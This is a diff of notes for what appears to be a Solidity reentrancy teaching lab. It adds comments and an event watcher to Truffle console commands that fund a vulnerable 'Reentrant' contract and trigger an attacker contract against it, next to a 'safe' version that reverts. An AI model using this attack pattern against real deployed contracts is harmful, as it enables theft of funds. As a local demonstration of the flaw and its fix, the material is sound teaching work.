@@ -136,9 +136,18 @@ ReentrantAttackerFailed.deployed().then(inst => inst.attack({ value: web3.toWei(
 ReentrantSafe.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
 shows 0 as revert() will rollback all state changes.
 
-MISC
+IMPROVED
+// assign the victim
 var honey; Reentrant.deployed().then(function(deployed){honey=deployed;});
+// assign the attacker
 var attacker; ReentrantAttacker.deployed().then(function(deployed){attacker=deployed;});
+// deposit amount to victim
 honey.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") })
+
+// track withdraw event on victim
+var theEvent = honey.WithdrawInvoked();
+theEvent.watch(function(err, result) { console.log(result.args.count.toNumber()) });
+
+// attack the victim
 attacker.attack({ value: web3.toWei(2, "ether") }).then(function(result){console.log(result.logs[0].args.count);});
 var log0; attacker.attack({ value: web3.toWei(2, "ether") }).then(function(result){log0 = result.logs[0];});
